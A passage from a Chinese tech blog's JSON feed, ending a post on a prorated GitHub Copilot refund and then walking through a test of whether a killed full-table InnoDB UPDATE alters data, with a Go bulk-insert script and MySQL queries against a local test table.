data-src=\"https://twelveeee-note.oss-cn-beijing.aliyuncs.com/Image/202406100146938.png\" alt=\"image-20240610013439182\" /></p>\n<h2 id=\"退款成功\"><a class=\"anchor\" href=\"#退款成功\">#</a> 退款成功</h2>\n<p>流程：</p>\n<p>先发工单看看能不能解封，不能解封就看看能不能按比例退款。</p>\n<p>按比例退款的流程，按照我的理解是：先发工单询问是否能够按比例退款，然后取消本年的 github copilot 的订阅，然后让客服帮忙按比例退款。</p>\n<p>我剩下 200 天左右，退了 54.92 刀 确实是按比例退款。及时止损，及时止损。</p>\n",
            "tags": [
                "计算机科学",
                "Project",
                "github"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2024/Database/innodb_update_all_table/",
            "url": "https://blog.twelveeee.top/2024/Database/innodb_update_all_table/",
            "title": "记录一次innodb 全表update",
            "date_published": "2024-05-26T04:00:00.000Z",
            "content_html": "<h1 id=\"全表-update\"><a class=\"anchor\" href=\"#全表-update\">#</a> 全表 update</h1>\n<h2 id=\"背景\"><a class=\"anchor\" href=\"#背景\">#</a> 背景</h2>\n<p>前几天在写 php 脚本的时候，复制别人的脚本。结果我改写过程中，update 的条件漏了 where 条件，当时就 throw error 了，按照我的经验我以为执行已经结束了，后面实际并没有执行结束。</p>\n<p>所以说，我对一个，线上，非常关键的表，量级大概 20g 数据，4 千万条数据的表执行了全表 update，并且执行了近乎一个小时。</p>\n<p>按照我对 mysql 事务的理解，一个 update 应该是一个事务，哪怕执行了一个小时，只要没有完全执行成功，都是不会实际更改表数据的。</p>\n<p>所以，我打算复现一下四千万级别的数据，执行全表 update ，执行一会之后再 kill，校验数据是否正确，验证是否数据会有异常</p>\n<h2 id=\"初始流程\"><a class=\"anchor\" href=\"#初始流程\">#</a> 初始流程</h2>\n<h3 id=\"表结构\"><a class=\"anchor\" href=\"#表结构\">#</a> 表结构</h3>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>table_update<span class=\"token punctuation\">`</span></span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token identifier\"><span class=\"token punctuation\">`</span>id<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">bigint</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">unsigned</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span> <span class=\"token keyword\">AUTO_INCREMENT</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token identifier\"><span class=\"token punctuation\">`</span>num<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span> <span class=\"token keyword\">DEFAULT</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token identifier\"><span class=\"token punctuation\">`</span>md5<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span> <span class=\"token keyword\">DEFAULT</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token identifier\"><span class=\"token punctuation\">`</span>type<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span> <span class=\"token keyword\">DEFAULT</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pid<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span> <span class=\"token keyword\">DEFAULT</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>id<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">)</span> <span class=\"token keyword\">ENGINE</span><span class=\"token operator\">=</span><span class=\"token keyword\">InnoDB</span> <span class=\"token keyword\">AUTO_INCREMENT</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token keyword\">DEFAULT</span> <span class=\"token keyword\">CHARSET</span><span class=\"token operator\">=</span>utf8mb4<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>其中，md5 为 num 的 md5，type 为 num%10，如果 num%10 &gt;7 这 type =7</p>\n<p>mysql 机器为 4c8g 的小主机，500g 固态硬盘。</p>\n<p>Server version: 5.7.42 MySQL Community Server (GPL)</p>\n<h3 id=\"导入数据\"><a class=\"anchor\" href=\"#导入数据\">#</a> 导入数据</h3>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> main</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token string\">\"crypto/md5\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token string\">\"database/sql\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token string\">\"encoding/hex\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token string\">\"fmt\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token string\">\"runtime\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token string\">\"strconv\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token string\">\"sync\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token boolean\">_</span> <span class=\"token string\">\"github.com/go-sql-driver/mysql\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">var</span> DB <span class=\"token operator\">*</span>sql<span class=\"token punctuation\">.</span>DB</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">var</span> lock sync<span class=\"token punctuation\">.</span>Mutex</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">type</span> Data <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tNum     <span class=\"token builtin\">int</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tMD5     <span class=\"token builtin\">string</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\tTypeNum <span class=\"token builtin\">int</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">calculateMD5</span><span class=\"token punctuation\">(</span>num <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\thasher <span class=\"token operator\">:=</span> md5<span class=\"token punctuation\">.</span><span class=\"token function\">New</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\thasher<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span>strconv<span class=\"token punctuation\">.</span><span class=\"token function\">Itoa</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token keyword\">return</span> hex<span class=\"token punctuation\">.</span><span class=\"token function\">EncodeToString</span><span class=\"token punctuation\">(</span>hasher<span class=\"token punctuation\">.</span><span class=\"token function\">Sum</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">nil</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">connectToDB</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>sql<span class=\"token punctuation\">.</span>DB<span class=\"token punctuation\">,</span> <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\tdb<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> sql<span class=\"token punctuation\">.</span><span class=\"token function\">Open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mysql\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"root:pass@tcp(localhost:3306)/log_analysis\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token keyword\">return</span> db<span class=\"token punctuation\">,</span> err</pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\truntime<span class=\"token punctuation\">.</span><span class=\"token function\">GOMAXPROCS</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token keyword\">var</span> err <span class=\"token builtin\">error</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\tDB<span class=\"token punctuation\">,</span> err <span class=\"token operator\">=</span> <span class=\"token function\">connectToDB</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t<span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t<span class=\"token keyword\">defer</span> DB<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token keyword\">var</span> maxID sql<span class=\"token punctuation\">.</span>NullInt64</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\terr <span class=\"token operator\">=</span> DB<span class=\"token punctuation\">.</span><span class=\"token function\">QueryRow</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"SELECT MAX(id) FROM table_update\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Scan</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>maxID<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t<span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tstart <span class=\"token operator\">:=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t<span class=\"token keyword\">if</span> maxID<span class=\"token punctuation\">.</span>Valid <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t\tstart <span class=\"token operator\">=</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>maxID<span class=\"token punctuation\">.</span>Int64<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\tdataChan <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> Data<span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t<span class=\"token keyword\">var</span> wg sync<span class=\"token punctuation\">.</span>WaitGroup</pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t\twg<span class=\"token punctuation\">.</span><span class=\"token function\">Add</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>pid <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t\t\t<span class=\"token keyword\">defer</span> wg<span class=\"token punctuation\">.</span><span class=\"token function\">Done</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t\t\t<span class=\"token keyword\">for</span> data <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> dataChan <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t\t\t\terr <span class=\"token operator\">:=</span> <span class=\"token function\">insertToDb</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>Num<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">.</span>TypeNum<span class=\"token punctuation\">,</span> pid<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">.</span>MD5<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t\t\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> start <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">40000000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t\t\tnum <span class=\"token operator\">:=</span> i</pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t\t\tmd5 <span class=\"token operator\">:=</span> <span class=\"token function\">calculateMD5</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t\t\ttypeNum <span class=\"token operator\">:=</span> num <span class=\"token operator\">%</span> <span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> typeNum <span class=\"token operator\">></span> <span class=\"token number\">7</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t\t\t\ttypeNum <span class=\"token operator\">=</span> <span class=\"token number\">7</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t\t\tdataChan <span class=\"token operator\">&lt;-</span> Data<span class=\"token punctuation\">&#123;</span>Num<span class=\"token punctuation\">:</span> num<span class=\"token punctuation\">,</span> MD5<span class=\"token punctuation\">:</span> md5<span class=\"token punctuation\">,</span> TypeNum<span class=\"token punctuation\">:</span> typeNum<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t\t<span class=\"token function\">close</span><span class=\"token punctuation\">(</span>dataChan<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\twg<span class=\"token punctuation\">.</span><span class=\"token function\">Wait</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">insertToDb</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">,</span> typeNum<span class=\"token punctuation\">,</span> pid <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> md5 <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t<span class=\"token comment\">// lock.Lock()</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t<span class=\"token comment\">// defer lock.Unlock()</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t<span class=\"token keyword\">if</span> num <span class=\"token operator\">%</span> <span class=\"token number\">10000</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Inserting\"</span><span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">,</span> md5<span class=\"token punctuation\">,</span> typeNum<span class=\"token punctuation\">,</span> pid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t<span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> DB<span class=\"token punctuation\">.</span><span class=\"token function\">Exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"INSERT INTO table_update (num, md5, type, pid) VALUES (?, ?, ?, ?)\"</span><span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">,</span> md5<span class=\"token punctuation\">,</span> typeNum<span class=\"token punctuation\">,</span> pid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t<span class=\"token keyword\">return</span> err</pre></td></tr><tr><td data-num=\"99\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"验证数据\"><a class=\"anchor\" href=\"#验证数据\">#</a> 验证数据</h3>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> table_update<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token number\">39999999</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">----------+</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">5.82</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> table_update <span class=\"token keyword\">WHERE</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">type</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">and</span> <span class=\"token keyword\">type</span> <span class=\"token operator\">!=</span> <span class=\"token punctuation\">(</span>num<span class=\"token operator\">%</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">or</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">type</span> <span class=\"token operator\">=</span> <span class=\"token number\">7</span> <span class=\"token operator\">and</span> <span class=\"token punctuation\">(</span>num<span class=\"token operator\">%</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">not</span> <span class=\"token operator\">in</span> <span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Empty <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">13.12</span> sec<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"操作流程\"><a class=\"anchor\" href=\"#操作流程\">#</a> 操作流程</h2>\n<h3 id=\"执行update\"><a class=\"anchor\" href=\"#执行update\">#</a> 执行 update</h3>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">UPDATE</span> table_update <span class=\"token keyword\">SET</span> <span class=\"token keyword\">type</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">-- 执行五秒后，执行</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">select</span> concat<span class=\"token punctuation\">(</span><span class=\"token string\">'kill '</span><span class=\"token punctuation\">,</span> id<span class=\"token punctuation\">,</span> <span class=\"token string\">';'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span>processlist <span class=\"token keyword\">where</span> Command <span class=\"token operator\">!=</span> <span class=\"token string\">'Sleep'</span> <span class=\"token operator\">and</span> <span class=\"token keyword\">Time</span> <span class=\"token operator\">></span> <span class=\"token number\">5</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token keyword\">Time</span> <span class=\"token keyword\">desc</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------------------------+</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">|</span> concat<span class=\"token punctuation\">(</span><span class=\"token string\">'kill '</span><span class=\"token punctuation\">,</span> id<span class=\"token punctuation\">,</span> <span class=\"token string\">';'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------------------------+</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">|</span> <span class=\"token keyword\">kill</span> <span class=\"token number\">190588</span><span class=\"token punctuation\">;</span>             <span class=\"token operator\">|</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">+</span><span class=\"token comment\">--------------------------+</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">-- 再执行 </span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">kill</span> <span class=\"token number\">190588</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">-- 此时</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">UPDATE</span> table_update <span class=\"token keyword\">SET</span> <span class=\"token keyword\">type</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>ERROR <span class=\"token number\">2013</span> <span class=\"token punctuation\">(</span>HY000<span class=\"token punctuation\">)</span>: Lost connection <span class=\"token keyword\">to</span> MySQL server during query</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">No</span> connection<span class=\"token punctuation\">.</span> Trying <span class=\"token keyword\">to</span> reconnect<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>Connection id:    <span class=\"token number\">190589</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">Current</span> <span 